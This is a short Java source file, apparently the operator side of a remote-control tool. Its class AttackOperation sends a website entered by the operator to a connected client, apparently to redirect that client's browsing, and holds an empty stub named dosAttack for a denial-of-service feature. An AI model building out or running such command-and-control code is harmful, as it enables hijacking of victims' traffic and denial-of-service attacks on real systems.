import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;

public class AttackOperation {
	static String send="",recive="";
	
	public static void webAttack(DataInputStream din,DataOutputStream dout,BufferedReader br)throws Exception{
		System.out.print("Enter the website to redirect the client: ");
		send = br.readLine();
		dout.writeUTF(send);
		recive = din.readUTF();
		System.out.println(recive);		
	}
	
	
	public static void dosAttack(){
		
	}
	
	
}
